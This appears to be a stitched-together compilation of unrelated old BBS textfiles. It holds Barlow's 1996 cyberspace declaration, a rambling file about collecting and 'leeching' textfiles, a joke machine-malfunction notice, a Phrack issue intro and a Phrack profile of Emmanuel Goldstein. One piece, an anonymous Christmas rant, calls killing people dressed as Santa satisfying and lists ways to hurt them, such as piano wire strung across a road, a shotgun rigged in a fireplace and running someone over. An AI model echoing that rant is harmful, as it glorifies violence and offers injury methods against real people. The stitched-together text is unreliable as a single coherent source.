"declarationbarlow1996.txt",5089,5089,252.7,4.08,114.66,"1996","1996","1996","declaration","A Declaration of the Independence of Cyberspace by John Perry Barlow  Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. On behalf of the future, I ask you of the past to leave us alone. You are not welcome among us. You have no sovereignty where we gather.  We have no elected government, nor are we likely to have one, so I address you with no greater authority than that with which liberty itself always speaks. I declare the global social space we are building to be naturally independent of the tyrannies you seek to impose on us. You have no moral right to rule us nor do you possess any methods of enforcement we have true reason to fear.  Governments derive their just powers from the consent of the governed. You have neither solicited nor received ours. We did not invite you. You do not know us, nor do you know our world. Cyberspace does not lie within your borders. Do not think that you can build it, as though it were a public construction project. You cannot. It is an act of nature and it grows itself through our collective actions.  You have not engaged in our great and gathering conversation, nor did you create the wealth of our marketplaces. You do not know our culture, our ethics, or the unwritten codes that already provide our society more order than could be obtained by any of your impositions.  You claim there are problems among us that you need to solve. You use this claim as an excuse to invade our precincts. Many of these problems don't exist. Where there are real conflicts, where there are wrongs, we will identify them and address them by our means. We are forming our own Social Contract. This governance will arise according to the conditions of our world, not yours. Our world is different.  Cyberspace consists of transactions, relationships, and thought itself, arrayed like a standing wave in the web of our communications. Ours is a world that is both everywhere and nowhere, but it is not where bodies live.  We are creating a world that all may enter without privilege or prejudice accorded by race, economic power, military force, or station of birth.  We are creating a world where anyone, anywhere may express his or her beliefs, no matter how singular, without fear of being coerced into silence or conformity.  Your legal concepts of property, expression, identity, movement, and context do not apply to us. They are all based on matter, and there is no matter here.  Our identities have no bodies, so, unlike you, we cannot obtain order by physical coercion. We believe that from ethics, enlightened self interest, and the commonweal, our governance will emerge. Our identities may be distributed across many of your jurisdictions. The only law that all our constituent cultures would generally recognize is the Golden Rule. We hope we will be able to build our particular solutions on that basis. But we cannot accept the solutions you are attempting to impose.  In the United States, you have today created a law, the Telecommunications Reform Act, which repudiates your own Constitution and insults the dreams of Jefferson, Washington, Mill, Madison, DeToqueville, and Brandeis. These dreams must now be born anew in us.  You are terrified of your own children, since they are natives in a world where you will always be immigrants. Because you fear them, you entrust your bureaucracies with the parental responsibilities you are too cowardly to confront yourselves. In our world, all the sentiments and expressions of humanity, from the debasing to the angelic, are parts of a seamless whole, the global conversation of bits. We cannot separate the air that chokes from the air upon which wings beat.  In China, Germany, France, Russia, Singapore, Italy and the United States, you are trying to ward off the virus of liberty by erecting guard posts at the frontiers of Cyberspace. These may keep out the contagion for a small time, but they will not work in a world that will soon be blanketed in bit bearing media.  Your increasingly obsolete information industries would perpetuate themselves by proposing laws, in America and elsewhere, that claim to own speech itself throughout the world. These laws would declare ideas to be another industrial product, no more noble than pig iron. In our world, whatever the human mind may create can be reproduced and distributed infinitely at no cost. The global conveyance of thought no longer requires your factories to accomplish.  These increasingly hostile and colonial measures place us in the same position as those previous lovers of freedom and self determination who had to reject the authorities of distant, uninformed powers. We must declare our virtual selves immune to your sovereignty, even as we continue to consent to your rule over our bodies. We will spread ourselves across the Planet so that no one can arrest our thoughts.  We will create a civilization of the Mind in Cyberspace. May it be more humane and fair than the world your governments have made before.  Davos, Switzerland February 8, 1996"

Christmas season is great, because if you kill Santa Clause all the little kids wont get shit gifts to open on the 24th!  Look at all these dueche bags out there dressed in those stupid red suits, wouldn't you feel satisfied by actually killing one or all of them   I would, I personally find great personal satisfaction in killing of as many bastards in thpse suits as possible, and that's why I'm here...  Share some personal experiences in killing of the Santa Clauses.    Stretch a piano cord across the road between two telephone poles so when the bastard  Saint Nick  come flying by on a sleigh or a fire engine his head will come right off.    Obtain a hand held land to air heat seaking missile, when he comes by, nuke the fuck to kingdome come!    Point a .45 caliber starting pistol at his head when he's in the mall and threaten to give him a massive vasectomy.  Then fire and watch the fat shit have a heart attack!    Put a gas burner on the bottom of your fire place.    Put a shot gun on the bottom of your fire place attacked to the handle on the flew.    Put a lot of oil on your roof and watch the fat shit try and land!    Kick him off his sleigh in mid air.    Put an altimeter bomb in his sleigh, so when he goes high enough it's bye bye for the fuck.    Loosen the blades on his sleigh when he trys to land, it's Santa all over the place.    Sacrifice his reign deer.    Bolt a rope to the roof of your house, and tie the other end to his sleigh. It's one fucked up sleigh when he gets moving.    Run over him with a car when he lands on the road.    Fire a fat seeking missile at his sleigh in mid air.    Have him arrested at night time for breaking and entering into your house.    When he comes down the chiminey, smash him across the face with a metal base ball bat.    Fire a flame thrower at him when he's a comin down the chimney.     Just remember when the old bastard comes        You better not pout, you better not cry, Santa Claus is coming to town.        little does the fat shit know if he comes near my town he's gonna have the      worst night of his life, not to mention the last.           When all else fails, kill the fuck....

All the boards I feel like calling are busy,  and I   felt this needed to be done. I just realized that I now have  roughly  1400   textfiles, which puts me as the person with the second largest collection of   textfiles  in  our  nation.  The person with the most textfiles is one Jason   Scott,  and he's responsible for at least half of my textfiles.  He  runs  a   board  called  the  Works!,  whose  number will be posted at the end of this   exercise in creative rambling.  So sit back, and enjoy  this  file, if  it   turns out to be the kind of thing you dig.    I'd  like  to  point  out that this is what I listened to while writing this   textfile.          Duty Now For The Future    Devo      Celebrate The Bullet    The Selecter        Say Yes To Another Excess    Yello            Abraxas    Santana     ii.         textfiles and related discussions    I think the textfile is on the rise. While Anarchy inc. may have disbanded,   their legacy of fine and  humorous  files  lives  on,  especially  on  Jason   Scott's  board   whose number,  as previously stated,  will be at the end of   this file.  So hold yer horses! ,  where there is an entire section  devoted   to  them.   Devoted...reminds me of last year in school,  when I wrote  I am   devoted to darkness  on all the desks that I sat at.  You'd be surprised  at   how many people have a great aversion to Satanic stuff,  especially when the   writing is accompanied by evil drawings.   Satan is my pal  was another fave   of mine.  Someone wrote,  Well, God's mine!  after that,  which gave me many   rich laffs. I was a sick freshmen.  But I digress...  Now, who remains   The   Neon Knights aren't seen around too much  anymore,  either.  But  without  a   doubt, the most well known of all textfiles is the Phrack.  Started by Taran   King,  it's just grown incredibly.  The next issue will be number 12.  I was   very annoyed to get Phrack 11 quite soon after it came out,  and was all set   to start u ling it everywhere,  when I noticed Thomas Covenant did the same.   So  he  stole  any  recognition  I  might get from u ling the latest Phrack.   Another thing that proves my point about the textfile world. There's a  mad   race,  when  something new comes out,  to distribute it.  Much like the  new   warez  of a couple of years ago.  Only,  it's looked  upon  in  rather  poor   taste to add your board number and stuff to the end of a Phrack, or an LOD H   Technical  Journal,  like  you  could  once  do  with  games you cracked or   distributed.  Speaking of the LOD H TJ   I was very early in getting it, and   began uploading it to places quickly.  This one I beat both Thomas  Covenant   and  Jason  Scott  to,  since it was only out in 'packed' format for Apples.   This thrills the hell out of you, I'm sure.   Anyway, the textfiles world is   pretty tough.  I do think,  however, that the quality of the work coming out   is improving.  Take a look at  Sex Change  from  Thomas  Covenant  of  Phido   Phreaks   now THAT is some excellent work.  Let's not forget Tristan Farnon,   either.  Anything  from  him can  be expected to be of a very high quality.   The fact that he's the only member of his group,  Starry Night  Productions,   could  serve as evidence that even groups like my two  which I did make up,   although there is one other person in it ,  which are made up  by  the  only   member  can  produce high quality stuff.  I'm not sure this stuff I'm coming   out with is of any great quality.  There are some who think I'm  funny,  and   others who find me to be like a pesky parasite, what with 50 line paragraphs   like this  one  I'm currently writing.  Personally,  if you don't like this   file,  I wish I could say I didn't care,  but it really  will  bother  me  a   little  if  you,  the reader,  vote this a bomb.  You'll notice that while I   write this, I use big words, and write like a textbook.  That's just the way   I write,  especially on essays,  but sometimes on textfiles and occasionally   messages.  Right now,  it's 11 26,  and I still haven't really said anything   of value.  That's why  I  get  such  great  grades  in  English,  since  the   requirements for  a 450 word essay can be met in just the opening paragraph   sometimes.  I think I'll start another paragraph  now,  just  to  break  the   monotony.   And if you don't think this is monotonous, bless you!       Three  groups to watch are Phido Phreaks,  OctoThorpe Productions,  and this   one   if  I  may  be so immodest .  They're all new  well,  Octothorpe just   started doing stuff , and have some good writers in them.  Phido Phreaks has   Thomas Covenant as well as the Silver Ghost, who has to be mentioned for the   sheer volume of stuff he puts out.  Pretty good stuff, too, unlike this file   which I'm starting to realize is getting more and  more  disjointed.  That's   entropy,  you  know. The  natural  tendency for  things  to  drift towards   randomness and chaos.  An idea which I  think  will  replace anarchy  in  a   matter  of  months.  I was going to change my group s  to Entropy Associates    which was on a dump truck in this filmstrip I saw in Chemistry supposed  to   illustrate  the concept of entropy.  That name really had an effect on me. ,   but I thought it'd be pretty lame,  since you might have already seen  RM MM   on  that  other  file  I  wrote   which I won't name,  since I'm not Captain   Goodnight .  Although, when I write 10 files, if such an event happens,  and   am  met  with  some  success,  I might change the name to Entropy Associates    e.a.  if I actually get some members besides my friend Zack.  OctoThorpe is   the group started by Jason Scott  the Slipped  Disk  when  he  started  his   board up.  It sat there,  in file directory 1, for at least 10 months, until   Jason's friend,  The Mathematician,  discovered modeming and  textfiles  and   writing  textfiles.  Some  of  his  stuff is pretty good,  too.  And Jason's   stuff,  with the backing of having read all 1500 textfiles of his,  is good,   too. Then  The  Cruiser started writing for Jason's group,  and it began to   get some members.  The Cruiser has written some  fairly  good  stories,  but   also some  unabashed  edits of  existing  files.  On  The Works!   home of   Octothorpe, Jason's board.  But you know that by now,  right,  genius  ,  my   file  um,  what was that called   was distibuted under the Octothorpe banner   as  Uncut,  Unedited,  and Unwanted .  Which afforded me a couple of  laffs.   Lastly,  my  group,  of which it's too soon to tell.  See if this file helps   you.      Shit,  my word processor just asked me if I wanted to  save  the  file.  And   upon doing so,  it wrote 8,400 bytes.  Which is a fucking lot.  My last file   was 15,000 bytes,  though...let's see how long this one  turns  out  to  be.   Actually, I should probably be doing my social studies, which is a report on   Aztec  History,  which  I  could frankly give a flying fuck about.  But it's   only 11 50, the night is still young...    The thing I hate are  anarchy  textfiles that are formulas for how  to  make   drugs  and  stuff.  I  really could not care less about how to make DMT from   banana peels or whatever.  I also don't like countless typed in portions  of   the  book  The Poor Man's James Bond  by Kurt Saxon.  The anarchy files that   I like are the kind that make me laugh.  The ever present  at least in  this   discussion  Anarchy inc.  wrote good stuff like that.  And I was laughing my   ass off  if such a  thing  is,  in  fact,  possible  at  the  file   Random   Senseless  Violence  by Count Nibble  his board,  Terrapin Station,  will be   included at the end of this file ,  which was great. I also like  his  file    Spray Paint   or whatever...I can't remember the exact title,  ok  ,  which   had me a'chucklin'.  I also like 'l00zer' files to a point,  but  then  they   start repeating themselves,  as the Silver Ghost succinctly satirized in his   file  Parodies .  It's 12 05,  and I'm getting kind of tired,  so  I'll  get   some sleep  and  start  a fresh new part tomorrow.  Part III.  Look for it.   But not too hard.   Note about parts   I have not written three files called    Ramblings ,  I've  just  separated  this file into several parts just to be   interesting.     iii.        9 57 am on the 14th and time to talk about text graphics    I think they're making a comeback,  personally.  I dig them.  Take a look at   the cover of this file.   Unless you're V iewing it on some AE, in which the   text graphics won't look very nice.   Due to the fact that the pseudo Xmodem   adds linefeeds,  so the whole file is double spaced.  But let me assure you   that they look pretty cool,  especially the  Red Menace  one.  I  like  that   sort of stuff.  In fact, I basically like text graphics.  For instance                                                                         o     o                                                                                                                                                                                                                                                                                                                                        _________                                                              m r .  l i d d y                                                                                        Well,  that was damn fulfilling.  I'm sure it looks really spiffy on the ol'   AE,  too.  Um,  anyway, maybe text PICTURES aren't that great.  But I really   like those graphics I put  in  the  beginning  of  my  textfiles.  For  some   reason.  Anyway,  it's now 10 45 exactly,  and I still haven't said anything   of merit.  So,  what should I talk about   Perhaps  another  section is  in   order   Yeah,  that'll  work.  One  on  leeching,  which is how I got all my   textfiles.    iv.         mr. pez and leeching    Leeching.  It still exists, trust me.  It will always exist. There are just   some boards which are destined to be leeched from.  The  Works!  is  one.  I   have sysop  access there,  so I get to read the callers log.  I see   BRUCE   GOLDMAN downloads about 50 files or so, until his time  99 minutes a day  is   up.  I look at bulletin 5.  He's downloaded 532 files, uploaded 8.  Which is   damn bad.  But then  again,  I  downloaded  350  from  the  Works!.  But  my   difference  is  that I contributed with messages,  so I wasn't just clogging   the board, leeching.  I was contributing to the message base and leeching.    Similarly,  AE's will ALWAYS be leeched from.  I mean,  if you don't have to   give a name, why upload   Or,  if sysops can't see what you're  doing,  who   knows  what you download    They do know what you upload.  On AE's,  since I   can't get programs since I have a veryfine IBM,  I V iew  a  lot  of  stuff.   That, in itself, is sort of leeching.  It assures me of a supply of AT LEAST   three  new textfiles a day.  I have to edit them,  but that's no problem.  A   scary new kind of AE is something called  TransPhor , which is in itself, an   AE.  I mean, the guy who wrote  it, Brew  Associates,  wrote  his  own  AE   program.  Anyway,  this thing takes note of what you download,  upload,  and    get this  V iew.  Is  that  a  riot or  what   That's  how  I  get  my  AE   textfiles, through V iewing! Oh well.     Of  course,  when  you leech,  you have to think about disk space.  I don't,   though.  Well,  I'm starting to,  since my hard disk slowly grows smaller...   less and less space free every day.   Since I get a couple new files a day.    You know,  on a PD board I'm on,  I just got my access  lowered  because  my   ratio  fell below 5 downloads to one upload. And the damn sysop has a 20 to   1 ratio on The Works!,  which is kind of funny.  I pointed this out to  him.   Haven't  seen his reply yet.  I posted it at 12 30  pm   yes,  I am starting   this at night again because all the boards are busy. ,  and it's  only  1 00    exactly   now.   The  12 30 was an approximation,  it is now exactly 1 00.   Wow, this must really pump yer 'nads.  Still,  what's the limit for sysops    I  mean,  you have to be somewhat tolerant of leeching  see, look what I've   grown to be by leeching! ,  but what's  the  limit   Jason  Scott  is  awful   lenient about his board,  but the sysop of that PD board was too tough about   it.  There's at least three boards better than his in the  area.   spiteful,   vindictive.. isn't it fascinating,  the leeching mentality   Anyway, I just   cleaned up my hard drive some.  I have the things  that  must  stay  on  the   drive, which take up about 5 megs.  That includes Procomm  my communications   program ,  DOS,  the Norton Utilities,  the  ARC  programs and other file   utilities in  DOWNLOAD,  my father's stuff like Lotus 1 2 3 and the programs   he's  working  on   he paid for the drive,  I have to put up with his stuff.   Only takes about a meg,  anyway. .  But I  have  the ARCs  of  all  Jason's   textfiles  on the drive,  which take up about 5 megs  which I haven't put on   disk for a very simple reason   I don't have any disks. ,  and I have a  few   games on disk, too.  Also, I have two BBS systems online, ARCed in suspended   animation,  until  I get around to testing them.   Editor's note   This has   gone on long enough. What ARC is is a utility that will allow you to take a   bunch of files and put it into one.  It also compresses files, and textfiles   crunch to about 50  of what they were   another reason why textfiles are  so   great!   I  have  a code hacker program  Brew Associate's CodeThief v2.2  in    DOWNLOAD UPLOAD  ed's note     is a path.  and three word  processors,  one   in  its own directory.  Well,  now that I've given you my whole fucking hard   drive  map,  I  might  as  well  start  talking  more  about leeching.   My   communications  program,  Procomm,  has a command file language which'll let   you program it to do stuff like log on to BBS's,  and download stuff   which   is  the relevance of this line of thought .  That's why I can have passwords   like  f duq!53  and not have to write them down.  Also,  I have a  different   password  for  nearly  every BBS I'm on.  Pretty safe,  eh   The other great   thing about command files is their effects on leeching  and uploading,  when   it  is  advisable .  I don't want to bother doing it on AE's  where I'd have   to open a log for everything,  and then  WAITFOR        to  close  the  log.    WAITFOR is a command which does almost exactly what you think.  But PCBoard   software,  which  is what The Works!  runs on,  is very easy to leech from.   Just WAITFOR the line  Main Board Command   and send  d   plus the file  you   wish to download,  then waitfor whatever it prints when it's ready to send,   and download it.   Shit.  Just  had  to  save  this  file  again.  It's  17k   already.  And then onto the next line.  Of course, I haven't figured out how   to  allow for errors,  like the file isn't there,  or line noise obliterates   the words,  so Procomm doesn't recieve them  as  they  should.  But  I  have   trouble  programming in BASIC,  even.  Boo.  Anyway, I've leeched about 100   files from The  Works!  that way.  But  my  leeching  from  The  Works!  is   irrelevent  now,  since Jason came over to my house when I had my going away   party  which wasn't too radical,  as can be imagined,  because Andrew Swartz   was  acting  really hyper because there were X rated movies and he had never   seen one.  I was listening to The DataMaster talking about  phreaking,  and   didn't  spend  too  much  time watching  Looking Good  or  A Cry For Cindy .   Andrew bothered me about it, but I'll just bet he took  the  words  of  the   Michael Jackson song and  Beat It  after seeing the movies.  I'll just bet.    in hopes of trading his textfiles for my guitar  bet you had to look back to   the  beginning  of  the parentheses!  along with some dough. My guitar is a    Harmony  and worth about  50.  Jason wanted to give  it  to  a  girl  named   Donna  who  he  feels something hormonal for.   If I may be so bold.  He was   copying the files onto my hard drive while trying to cajole me  into giving   him  my  guitar.  It was  a gift,  so  I  never did.  But I still have the   textfiles,  and read a few every day.  It's harder  than  you  think.  DOS's   default  white on black  starts  jittering around  on the CGA  and your eyes   start doing the funky chicken.   Who knows where I  got  that  phrase.   But   they're  mostly  pretty  good.  There's  a  44k  file of taped conversations   between this guy and important people he met at TAP  meetings.  Sounds  like   something  I would do.  I occasionally tape my conversations,  if they sound   like they're going to be interesting.   Now it's 1 33, and my word processor   just saved the file...it was 19k.  Bloated. Plus,  you must be going crazy   from staring at this huge paragraph.  But I  never  type  them  in.  Another   file is a 220k file about D D.  w0w.  Another is a 70k file of a Howard the   Duck comic  book  script.  Which  doesn't  really  interest  me.  But  could   interest  someone.  Anyway,  I  have more than enough textfiles to set up a   board,  but I don't think I have the disk space,  if I  still  want  to  use   programs  on my hard disk.  I was going to set it up at my own line  yes,  I   have my own line,  and pay the bills,  which are not that much. ,  but never   got  around  to  it. Too late now,  eh    I'm moving to Michigan in about 5   days.  I can still leech there, I'm sure.  Should be even better, since that   house is really cool.  Maybe the other line  my family's line  will be  even   closer,  so  I  can talk to people while calling boards.  The other  family    line was in the other room, but my father disconnected it,  because I made a   few  calls  on  it,  when  I  have   my  own line and should use THAT,  fer   crissakes!  or something to that effect.  Now,  I can  only  make  calls  by   going into the kitchen or upstairs,  which is not good for short files.  But   long files,  like Phracks,  or the LOD H Technical Journal,  can be uploaded   while carrying on a fairly lengthy conversation.    v.            is it the end   at last      The  preceding  paragraph is 87 lines long   more than a printed page.  This   leads me to end this file,  and soon.  Well, if you're not asleep,  tell me   what you think about it.  I mean, don't you have to wonder about someone who   can  ramble  on  for 8 fucking pages    That's how long this file is.  Well,   these boards below earn the official  PEZ   stamp  o'  approval.

This machine contains a special circuit called a 'Crisis Detector' or 'CD' . It is specifically designed to detect the user's emotional state in terms of how desperately the user needs to use the machine.  The machine, upon measuring this state, assigns a value, called the 'Crisis Detection Level'  or 'CDL' . It has been programmed to subsequently create a malfunction in direct proportion to this CDL, thus rendering the machine totally and hopelessly useless to the user for whatever period of usefulness it may have served.    Threatening the machine with violence, curses, obscenities, etc., may soothe the user, but will serve no other useful purpose, as the CD is not affected, and the CDL is not, repeat, NOT reset. Likewise, attempts to use another machine is likely to cause IT to malfunction, since they both belong to the same union LOCAL  347 .  Just give up, and come back later, when you have absolutely NO use for the machine, as by then the CD will have noted your absence and will have reset the CDL for its next victim.    NOTE   Attempts to go away and come back a few minutes later are not liable to fool the CD, as your level of desperation will only have increased during said period of time.  Just give up.  It's truly HOPELESS.  "

For those of you who have been with us from the beginning, the date on this issue may hold some historical significance                        Happy Fourth Anniversary Phrack Inc.!       This issue we feature two files dealing with electronic fund transfer written by a member of the Legion of Doom who wishes to remain anonymous. The second article tells a story detailing how an actual electronic fund transfer might take place    Is it true or is it fiction   We decided to let you, the reader, decide that for yourself.       The Future Transcendent Saga continues as usual in this issue with part two of  Introduction to the Internet Protocols.   We also present to you the second edition of Network Miscellany which focuses largely on Public Access Unix systems around the country.  Last, but not least, concerning the wide area networks, we have Covert Paths    a file about hacking on the Internet and how to make sure you cannot be tracked down.       On a lighter note, it appears that Teleconnect Magazine liked The Mentor's  Hacker's Manifesto  so much that they decided to print a portion of it in their November 1989 issue.  If you receive this magazine you will find it on page 55, but only the last 4 paragraphs  they apparently did not like the beginning of the file .  The interesting thing is that Teleconnect claims that they were given the article by MCI Security who recently discovered it on a bulletin board.  If you are a long time reader of Phrack Inc., you might remember that this article was dated for January 8, 1986 and originally appeared in Phrack Inc. Newsletter Issue VII  file 3 of 10  and again in issue XXIV  file 3 of 9 .

Phrack Pro Phile was created to bring information to you, the community, about retired or highly important  controversial people.  This edition of the Phrack Pro Phile starts a different format as I'm sure you will notice.  The skeleton of the Pro Phile is a form in which the people fill in the blanks.  Starting now, using their words  and a little editing , the Pro Phile will be presented in first person format.  This month, we present to you the editor of one of the most prominent printed phreak hack newsletters of all times...                                Emmanuel Goldstein                                                              Handle   Emmanuel Goldstein          Call Him   Call me anything.  Just look me in the eye.      Past Handles   Howard Tripod, Sidney Schreiber, Bob Hardy, Gary Wilson,                     Clint Eastwood, 110.  There are others that I keep quiet                     about.     Handle Origin   I prefer using regular names rather than descriptive                     boastful titles  i.e.,  The Hacker King,  who,                     incidentally, I don't wish to offend if he she even exists                      this is just an example .  The names I use are either                     people I've  become  or names that bestow a certain image.                     Emmanuel Goldstein, for instance, led the resistance in                      1984.   But then, there was talk that he never really                     existed and was just created by the government in order to                     capture the real subversives.  I don't think that's the                     case with me.         Computers   I use PC compatibles for the most part.  I also play around                     with Macs but they're not REAL computers to me.  My                     favorite machine of all time is the Zenith Z 100, a                     dual processor computer that can emulate an old fashioned                     H8 or an IBM PC.  It runs lots of operating systems and has                     a great keyboard.  Too bad it was discontinued four years                     ago.... Sysop Co Sysop Of   The old Plovernet on Long Island  1984 , Private Sector in                     New Jersey  1985, 1986 , and the present and future 2600                     boards.  Origins in Phreak Hack World                              I've been playing with phones all of my life and I started playing with computers the first time I saw one.  I always seemed to get in trouble for doing things I wasn't supposed to... crashing the PDP 10 in high school... flashing the switchhook on my phone 95 times and getting an angry switchman who wouldn't release the line, claiming I broke it  I was 10 .  As computers and phones started to become integrated, I realized what hacking really was    just asking a lot of questions and being really persistent.  A lot of people don't like that, whether it's computers or real life, but how else are you going to learn what's REALLY happening and not just what others WANT you to know   Origins in Phreak Hack BBSes                              I don't really have a BBS reputation to speak of.  They tend to disappear rather quickly and that tends to dampen my enthusiasm towards them quite a bit, but I do want to see more and more of them come up and begin to reach out and be creative.  They also have to challenge the system some more.  2600 has a very strong opinion on BBS privacy, namely that the same rights afforded to any publication should be extended to a bulletin board, but every BBS owner should know the importance of this and should be willing to fight for it.  If you didn't believe in preserving the First Amendment, you probably wouldn't go out and buy a newspaper, would you   A BBS is the same thing and anyone who runs a system should see this connection.  Hackers tend to bring this issue to the forefront a bit more, but this is something that applies to all bulletin boards.  Encounters With Phreakers and Hackers                                       Meeting Captain Crunch in Amsterdam this past summer was a real trip.  Finding out who Cable Pair really was certainly resulted in some highlights.  I've met a lot of  famous  phreaks and hackers and now I know a lot of foreign ones, but I'm always amazed at the number of people I meet  mostly in New York  who say they've been hacking since the sixties.  There's an awful lot of people out there who are into this kind of stuff, which is something I never knew before I started being open about these particular interests.  Experience Gained In The Following Ways                                         Social engineering, of course.  I like hacking computers when I'm not feeling social because you don't have to adjust your attitude to get a reply, but people hacking is so much more satisfying.  No matter how many security codes and precautions are taken, as long as one person without knowledge is able to talk to another with knowledge, it will always be possible to get things out of them.  Most of the really important bits of information I've been able to get are through people, not computers.  Knowledge Attributed To...                            Ignorance.  I built up my knowledge by wandering around in places others thought unimportant.  Hacking can be like trashing.  It looks like garbage or a waste of time to most, but if you keep your mind open, you can learn a lot.  If more people felt this way, hackers would stand out less because everyone would be a bit more adventurous, but ignorance prevails and we learn what nobody else cares about...that is until it affects them.  Work Schooling                I got an English degree at Stony Brook  it's currently gathering dust in a closet .  I should note that I've never taken a computer course, nor do I intend to.  I've worked as a limo driver, a Good Humor man, and a typesetter, and more recently, as a freelance writer, a reporter for Pacifica Radio, and a radio engineer producer and talk show host.  Busted For...               I used to make free phone calls all the time.  Now, obviously, I can't do that, since I'm in the public eye, but that's not a drawback to me because I can still experiment all I want.  Nothing can change that.  For the most part I was careful while I was doing these things, but there was one time when my luck ran out.  I had been using Telemail to communicate with some other people and they, unknown to us, had been looking for hackers on their system.  They found us, the members of PHALSE  Phreakers, Hackers, and Laundromat Service Employees  I'm told the feds spent a lot of time investigating the laundry connection, even though we only used it to spell out the word PHALSE!  .  I believe four people got indicted in that adventure.  I was one of them.  Bill Landreth was another.  They thought I was the ringleader so they gave me a 10 count indictment, more than twice what anyone else got.  Without hiring an expensive lawyer, I talked to a roomful of feds about the system and what was wrong with it.  I made it clear that I wasn't turning anybody in    even if I wanted to I still didn't know who or where they were.  I think I was dealt with fairly.  I told them what I did and paid for the time I used.  Nothing more.  That was in 1984 when 2600 was just getting off the ground.  A couple of years ago, one of the feds who had questioned me tried to get me to work for them.  Not to entrap hackers, but Soviet spies.  And so it goes.  Interests           I guess I'm an explorer because everything I like doing involves exploration of some sort.  Obviously, hacking contains a good amount of that.  I like traveling quite a bit, particularly when I'm free to do whatever the hell I want.  Traveling with people is fun but it can also be a drag because something you want to do puts them off and then you either wind up not doing it or doing it and pissing them off.  I like to ride subways to weird places and walk through bad neighborhoods.  It's all a part of exploring and seeing the world through different eyes.  A couple of years ago I went to Baffin Island and hung out for a week with Eskimos.  Everyone thought I was crazy but I had a great time.  I'm also into astronomy, but not the classroom kind.  I took a course in astronomy once and it was the biggest mistake of my life.  All we did was talk about equations.  I like to look at the sky and read about what's being discovered up there.  When the space telescope goes up next year, interest in space will rise again.  Then there's free lance writing, which I have to devote more time to.  I'm working on a couple of plays, some short stories, a screenplay for a movie, and a screenplay for TV.  I'll probably focus on the plays only because there's so much bullshit involved in TV and movies.  And finally, there's radio.  I've been in radio for just over 10 years, doing whatever comes to mind on WUSB FM in Stony Brook, NY, a small, noncommercial radio station at the State University.  Now I also work at WBAI FM, a much larger station in New York City with the same kind of free form attitude. There's so much you can do with radio, but so few stations want to take a chance any more.  That's why they all sound the same.  Unfortunately, when you sell commercials, you also sell your freedom.  I've seen it enough times to know it's true and that's the reason I've stayed out of commercial radio. Right now I do a weekly talk show on WUSB called  Brain Damage  where I take calls, play with the phones, and air tapes from Radio Moscow.  On WBAI I'm doing two shows    News of the World  which is a compilation of foreign news reports and  Off The Hook,  a program about, you guessed it, phone phreaks.  Favorite Things                 I like hanging out with fun people who are open minded, non judgmental, and preferably insane to a degree.  I enjoy talking on the phone with friends and strangers alike.  Strangers are different because you can be whoever you want to be with them.  They tend to believe almost anything you say.  Music is really important.  Right now I like rappers and toasters the most, with soca and hardcore close behind.  Ska's real good too, but there's not much coming out.  The record I put on when I wake up sets my mood for the day.  I like music with lyrics that mean something.  There's a time and a place for mindless droning but there's too much of it around.  Music should have meaning.  In Jamaica, people don't buy newspapers.  They buy records and that's how they learn what's going on and what the latest catch phrases are.  Some of my favorite rock bands include The Clash, Big Audio Dynamite, Dead Kennedys, Donner Party, Public Enemy, Camper Van Beethoven, Pink Floyd, Fun Boy Three, De La Soul, and Anti Nowhere League.  Some of my favorite solo artists are Tracy Chapman, John Lennon, Elvis Costello, and Patsy Cline.  I realize I'm very lucky because I work in an environment  noncommercial radio station  that gets over 100 new albums a week.  I don't know how I would have ever found some of the stuff I like if I didn't have that kind of access.  Inside Jokes                OK, if we can't have a tour, can we at least have a look around      I'm not allowed to talk to you any more.     This is the Sprint operator.  I have a collect call from AT T.     There aren't any more supervisors, sir.  You've spoken to all of them.     Iran, will you hang up!  Sir, do you speak what he speaks      I said, DON'T hit return!     But we didn't know it was the foreign minister!     Repair serv   damn!  There it goes again.  What the hell's wrong with    these phones      Just tell me how much money you lost and I'll arrange for a trial date.   Serious Section                 Being a part of the hack phreak community, you get to experience unique little adventures that the  average  person has no conception of.  We talk to people over the phone and have no idea what they look like, often no idea what they even sound like  BBSes .  We play with technology and are thought of as geniuses merely because the rest of the world doesn't understand what we're doing.  I think that goes to our heads sometimes, which is bad for everyone. We should apply our knowledge and skills not only to help ourselves by getting a high paying job somewhere but to help others as well.  Look what happened in China.  Using FAX machines, modems, and redial functions, people forced information into the country and tied up the government's snitch lines which probably saved a few lives.  The  average  person would never think of applying technology in this way, but we do and we know how to do it efficiently, quickly, and without spending money.  It's because of that last one that we've got freedom.  Most people don't do things because of the cost.  Without having to worry about that, you can be a lot more imaginative.  Of course, that also makes it illegal, which is enough to stifle some of us.  What we do and how we do it is a decision we each have to make, but we should stop wasting time boasting and get on with the exploring and the learning and the new applications.  Another thing that really gets me is the person who says,  hacking and phreaking isn't what it used to be.   First off, if nothing changes, life gets pretty dull.  Second, that statement is usually a precursor to something like,  what kids do today isn't real hacking.  What I did 5, 10, 20 years ago was REAL hacking.   Generalizations like that are worthless.  It's just like yuppies going on about the Beatles, calling that real music, and saying the sounds of today are crap  by the way, I like the Beatles a lot .  At the same time, too many hackers are just starting out and thinking they know it all, dismissing everything that happened before they were around.  The spirit of today's hacker is often the same as that of a phone phreak of the sixties. And there were people like us around 100 years ago but we're even more far removed from what they could have possibly been doing.  The point is that there's a bond that ties a lot of us together    it cuts through time and backgrounds.  Like anything else, there's too much hypocrisy and judging going on in the hack phreak world.  I think it's a real waste of time.  Are Phreaks Hackers You've Met Generally Computer Geeks                                                           Not in the least.  Those people that I've come to know have turned out to be just about everything you can imagine.  White Black, Jew Gentile, straight gay, male female, opened closed, you name it.  Everyone's got different sides to them, stuff they don't always want others to know.  Sometimes we try to squash those other sides of us, but they still exist.  I've met hackers who have geekish qualities but once you get to know them, you realize there's more to them.  Of course, there are lots of hackers I would never want to know in a million years  that's just the way I am with a lot of people.  I think it was Linus Van Pelt who said,  I love mankind.  It's people I can't stand.                                         END                                                  Phrack Inc.

